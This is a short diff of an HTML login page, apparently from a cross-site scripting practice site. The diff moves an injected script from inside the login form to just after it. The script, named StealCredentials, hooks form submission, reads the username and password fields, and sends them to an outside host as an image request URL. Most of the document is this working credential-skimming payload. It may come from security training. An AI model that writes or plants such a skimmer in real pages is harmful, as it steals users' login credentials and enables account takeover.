@@ -31,19 +31,6 @@
   <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
-    
-      <script type="text/javascript"> 
-        function StealCredentials() {
-            var username = document.getElementById("login_username").value;
-            var pass = document.getElementById("login_password").value;
-            var credentials = "username = " + username + " | " + "password = " + pass;
-            img = document.createElement("img");
-            console.log(credentials); 
-            img.src = "https://r7.io/e/nhytrek?s=" + credentials;
-        }
-        document.forms[0].onsubmit = StealCredentials;
-        console.log("run");
-      </script>
         
 
       <div id="login-fields-wrapper">
@@ -62,6 +49,18 @@
       </div>
       <div id="social" style="hidden"></div>
   </form>
+  <script type="text/javascript"> 
+    function StealCredentials() {
+        var username = document.getElementById("login_username").value;
+        var pass = document.getElementById("login_password").value;
+        var credentials = "username = " + username + " | " + "password = " + pass;
+        img = document.createElement("img");
+        console.log(credentials); 
+        img.src = "https://r7.io/e/nhytrek?s=" + credentials;
+    }
+    document.forms[0].onsubmit = StealCredentials;
+    console.log("run");
+  </script>
 </div>
 
 
